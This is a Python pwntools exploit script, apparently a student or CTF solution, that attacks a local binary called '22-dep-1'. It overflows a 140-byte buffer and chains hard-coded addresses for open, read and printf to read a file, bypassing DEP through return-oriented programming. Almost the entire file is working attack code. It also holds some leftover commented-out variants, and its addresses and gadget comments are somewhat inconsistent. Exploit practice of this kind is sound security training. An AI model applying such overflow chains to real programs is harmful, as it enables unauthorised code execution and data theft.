#!/usr/bin/env python3
import struct

from pwn import *
from pwn import asm, context, gdb, p8, p16, p32, process

context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "DEBUG"


p = process(["./22-dep-1"], setuid = False)
# p = gdb.debug(["./22-dep-1"])
p.recv()
offset = 140
some_function=  0x08048894
# __libc_read = 0x806d340
# __libc_write = 0x806d3b0
printf_func = 0x0804EDE0

open_func = 0x08048894
read_func = 0x806D340
write_func = 0x0806D3B0

buff_start = 0xFFFFD0E0
exit = 0x804E470
pop3_ret = 0xf7ffd079 #: pop edx ; pop ecx ; pop ebx ; ret
# offset = p8(0x00) * 140
# payload = p8(0x00) * 140

# Start with padding up to the offset, then layer the rest by offsets
# prefix  = b"A" * offset
gdb.attach(p)
# payload = flat({
#     offset: p32(some_function),
#     offset + 4: p32(read_func),
#     offset + 8 : p32(pop3_ret),
#     offset +12 : p32(3),
#     offset +16 : p32(buff_start),
#     offset + 20: p32(100),
#     offset + 24: p32(printf_func),
#     # offset + 28: p32(0x0804edfd),
#     offset+32: p32(buff_start)
#     # offset + 16: 3,
#     # offset + 20: p32(buff_start),  # buffer
#     # offset + 24: 100,
# })
payload = b'A'*offset
payload+= p32(some_function)
payload+= p32(read_func)
payload+= p32(printf_func)
payload+=p32(3)
payload+=p32(buff_start)
payload+=p32(100)
with open("shellcode.bin",'wb') as outfile:
    outfile.write(payload)
p.sendline(payload)
# p.recvline()
p.interactive()
# print(p.recvline().decode())